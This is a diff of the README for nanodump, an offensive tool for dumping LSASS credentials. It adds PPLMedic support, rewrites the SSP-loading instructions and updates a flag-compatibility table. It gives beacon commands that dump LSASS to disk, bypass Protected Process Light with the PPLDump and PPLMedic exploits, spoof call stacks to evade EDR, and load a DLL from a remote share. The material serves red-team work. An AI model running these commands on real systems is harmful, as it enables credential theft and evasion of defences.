@@ -147,35 +147,39 @@ Use the `--seclogon-duplicate` flag to access this functionality.
 
 <h3>Load nanodump as an SSP</h2>
 
-You can load nanodump as an SSP in LSASS to avoid opening a handle. The dump will be written to disk with an invalid signature at `C:\Windows\Temp\report.docx` by default. Once the dump is completed, `DllMain` will return FALSE to make LSASS unload the nanodump DLL.  
-To change the dump path and signature configuration, modify the function `NanoDump` in [entry.c](source/entry.c) and recompile.  
+You can load nanodump as an SSP in LSASS to avoid opening a handle.  
+When the DLL has been loaded into LSASS, the parameters will be passed via a named pipe and once the dump is completed, `DllMain` will return FALSE to make LSASS unload the nanodump DLL.  
+You can hardcode the parameters into the DLL and avoid using the named pipe altogether with the compiler flag `PASS_PARAMS_VIA_NAMED_PIPES=0`.  
 
 <h4>Upload and load a nanodump DLL</h3>
 
-If used with no parameters, an unsigned nanodump DLL will be uploaded to the Temp folder. Once the dump has been created, manually delete the DLL with the `delete_file` command.  
+By default, an unsigned nanodump DLL will be uploaded to the Temp folder which will be deleted automatically.  
 ```
-beacon> load_ssp
-beacon> delete_file C:\Windows\Temp\[RANDOM].dll
-```
-<h4>Load a local DLL</h3>
-
-```
-beacon> load_ssp c:\ssp.dll
+beacon> nanodump_ssp -v -w C:\Windows\Temp\lsass.dmp
 ```
 
-<h4>Load a remote DLL</h3>
-
+If you want to load a pre-existing DLL, you can run:
 ```
-beacon> load_ssp \\10.10.10.10\openShare\ssp.dll
+beacon> nanodump_ssp -v -w C:\Windows\Temp\lsass.dmp --load-dll C:\Windows\Temp\ssp.dll
 ```
 
-
-<h3>PPL bypass</h2>
+<h3>PPL Dump exploit</h2>
 If LSASS is running as Protected Process Light (PPL), you can try to bypass it using a userland exploit discovered by Project Zero. If it is successful, the dump will be written to disk.  
 
-To access this feature, use the `nanodump_ppl` command
+> Note that this vulnerability has been fixed in the July 2022 update pack (Windows 10 21H2 Build 19044.1826)
+
+To access this feature, use the `nanodump_ppl_dump` command
 ```
-beacon> nanodump_ppl -v -w C:\Windows\Temp\lsass.dmp
+beacon> nanodump_ppl_dump -v -w C:\Windows\Temp\lsass.dmp
+```
+
+<h3>PPL Medic exploit</h2>
+Nanodump also implements the PPLMedic exploit, which works on systems that have the July 2022 update pack.  
+The parameters will be passed to the nanodump DLL via a named pipe. You can hardcode the parameters into the DLL and avoid using the named pipe altogether with the compiler flag PASS_PARAMS_VIA_NAMED_PIPES=0.  
+
+To access this feature, use the `nanodump_ppl_medic` command
+```
+beacon> nanodump_ppl_medic -v -w C:\Windows\Temp\lsass.dmp
 ```
 
 <h3>WerFault</h2>
@@ -223,23 +227,24 @@ To access this feature, use the paramter `--spoof-callstack` with the values `sv
 You can combine many techniques to customize how nanodump operates.  
 The following table indicates which flags can be used together.
 
-|                        | --write | --valid | --duplicate | --elevate-handle | --duplicate-elevate | --seclogon-leak-local | --seclogon-leak-remote | --seclogon-duplicate | --spoof-callstack | --silent-process-exit | --shtinkering | --fork | --snapshot | SSP | PPL |
-|------------------------|:-------:|:-------:|:-----------:|:-----------------:|:---------------------:|:---------------------:|:----------------------:|:--------------------:|:-----------------:|:---------------------:|:-------------:|:------:|:----------:|:---:|:---:|
-| --write                | ✓       | ✓       | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       |               | ✓      | ✓          |     | ✓   |
-| --valid                | ✓       | ✓       | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       |               | ✓      | ✓          |     | ✓   |
-| --duplicate            | ✓       | ✓       | ✓           |                   |                       |                       |                        |                      |                   |                       | ✓             | ✓      | ✓          |     | ✓   |
-| --elevate-handle       | ✓       | ✓       |             | ✓                 |                       |                       |                        |                      | ✓                 |                       | ✓             | ✓      | ✓          |     |     |
-| --duplicate-elevate    | ✓       | ✓       |             |                   | ✓                     |                       |                        |                      |                   |                       | ✓             | ✓      | ✓          |     |     |
-| --seclogon-leak-local  | ✓       | ✓       |             |                   |                       | ✓                     |                        |                      |                   |                       | ✓             | ✓      | ✓          |     |     |
-| --seclogon-leak-remote | ✓       | ✓       |             |                   |                       |                       | ✓                      |                      |                   |                       | ✓             | ✓      | ✓          |     |     |
-| --seclogon-duplicate   | ✓       | ✓       |             |                   |                       |                       |                        | ✓                    |                   |                       | ✓             | ✓      | ✓          |     |     |
-| --spoof-callstack      | ✓       | ✓       |             | ✓                 |                       |                       |                        |                      | ✓                 |                       | ✓             | ✓      | ✓          |     |     |
-| --silent-process-exit  |         |         |             |                   |                       |                       |                        |                      |                   | ✓                     |               |        |            |     |     |
-| --shtinkering          |         |         | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       | ✓             |        |            |     |     |
-| --fork                 | ✓       | ✓       | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       |               | ✓      |            |     |     |
-| --snapshot             | ✓       | ✓       | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       |               |        | ✓          |     |     |
-| SSP                    |         |         |             |                   |                       |                       |                        |                      |                   |                       |               |        |            | ✓   |     |
-| PPL                    | ✓       | ✓       | ✓           |                   |                       |                       |                        |                      |                   |                       |               |        |            |     | ✓   |
+|                        | --write | --valid | --duplicate | --elevate-handle | --duplicate-elevate    | --seclogon-leak-local | --seclogon-leak-remote | --seclogon-duplicate | --spoof-callstack | --silent-process-exit | --shtinkering | --fork | --snapshot | SSP | PPL_DUMP | PPL_MEDIC |
+|------------------------|:-------:|:-------:|:-----------:|:-----------------:|:---------------------:|:---------------------:|:----------------------:|:--------------------:|:-----------------:|:---------------------:|:-------------:|:------:|:----------:|:---:|:--------:|:---------:|
+| --write                | ✓       | ✓       | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       |               | ✓      | ✓          |     | ✓        | ✓         |
+| --valid                | ✓       | ✓       | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       |               | ✓      | ✓          |     | ✓        | ✓         |
+| --duplicate            | ✓       | ✓       | ✓           |                   |                       |                       |                        |                      |                   |                       | ✓             | ✓      | ✓          |     | ✓        |           |
+| --elevate-handle       | ✓       | ✓       |             | ✓                 |                       |                       |                        |                      | ✓                 |                       | ✓             | ✓      | ✓          |     |          | ✓         |
+| --duplicate-elevate    | ✓       | ✓       |             |                   | ✓                     |                       |                        |                      |                   |                       | ✓             | ✓      | ✓          |     |          |           |
+| --seclogon-leak-local  | ✓       | ✓       |             |                   |                       | ✓                     |                        |                      |                   |                       | ✓             | ✓      | ✓          |     |          |           |
+| --seclogon-leak-remote | ✓       | ✓       |             |                   |                       |                       | ✓                      |                      |                   |                       | ✓             | ✓      | ✓          |     |          |           |
+| --seclogon-duplicate   | ✓       | ✓       |             |                   |                       |                       |                        | ✓                    |                   |                       | ✓             | ✓      | ✓          |     |          |           |
+| --spoof-callstack      | ✓       | ✓       |             | ✓                 |                       |                       |                        |                      | ✓                 |                       | ✓             | ✓      | ✓          |     |          |           |
+| --silent-process-exit  |         |         |             |                   |                       |                       |                        |                      |                   | ✓                     |               |        |            |     |          |           |
+| --shtinkering          |         |         | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       | ✓             |        |            |     |          |           |
+| --fork                 | ✓       | ✓       | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       |               | ✓      |            |     |          |           |
+| --snapshot             | ✓       | ✓       | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       |               |        | ✓          |     |          |           |
+| SSP                    |         |         |             |                   |                       |                       |                        |                      |                   |                       |               |        |            | ✓   |          |           |
+| PPL_DUMP               | ✓       | ✓       | ✓           |                   |                       |                       |                        |                      |                   |                       |               |        |            |     | ✓        |           |
+| PPL_MEDIC              | ✓       | ✓       |             | ✓                 |                       |                       |                        |                      |                   |                       |               |        |            |     |          | ✓         |
 
 <h2 id="examples">4. Examples</h2>
 
@@ -284,9 +289,14 @@ Load nanodump in LSASS as an SSP remotely:
 beacon> load_ssp \\10.10.10.10\openShare\nanodump_ssp.x64.dll
 ```
 
-Dump LSASS bypassing PPL, duplicating the handle that csrss.exe has on LSASS:
+Dump LSASS bypassing PPL using the PPLDump exploit, duplicating the handle that csrss.exe has on LSASS:
 ```
-beacon> nanodump_ppl --duplicate --write C:\Windows\Temp\lsass.dmp
+beacon> nanodump_ppl_dump --duplicate --write C:\Windows\Temp\lsass.dmp
+```
+
+Dump LSASS bypassing PPL using the PPLMedic exploit, opening a low privileged handle to LSASS and then elevating it:
+```
+beacon> nanodump_ppl_medic --elevate-handle --write C:\Windows\Temp\lsass.dmp
 ```
 
 Trick seclogon to open a handle to LSASS and duplicate it, then download the dump with an invalid signature:
@@ -357,7 +367,7 @@ location ~ ^...$ {
 - [xpn](https://twitter.com/_xpn_) for [Exploring Mimikatz - Part 2 - SSP](https://blog.xpnsec.com/exploring-mimikatz-part-2/)
 - [Matteo Malvica](https://twitter.com/matteomalvica) for [Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start](https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/)
 - [James Forshaw](https://twitter.com/tiraniddo) for [Windows Exploitation Tricks: Exploiting Arbitrary Object Directory Creation for Local Elevation of Privilege](https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html)
-- [itm4n](https://twitter.com/itm4n) for the original PPL userland exploit implementation, [PPLDump](https://github.com/itm4n/PPLdump).
+- [itm4n](https://twitter.com/itm4n) for the original PPL userland exploits implementation, [PPLDump](https://github.com/itm4n/PPLdump) and [PPLMedic](https://github.com/itm4n/PPLmedic).
 - [Asaf Gilboa](https://mobile.twitter.com/asaf_gilboa) for [Lsass Memory Dumps are Stealthier than Ever Before - Part 2](https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2) and the Shtinkering technique
 - [William Burgess](https://twitter.com/joehowwolf) for [Spoofing Call Stacks To Confuse EDRs](https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs)
 - [Sebastian Feldmann](https://twitter.com/thefLinkk) and [Fabian](https://twitter.com/testert01) for the _elevate handle_ technique discussed at [Morph Your Malware!](https://www.youtube.com/watch?v=AucQUjJBJuw)
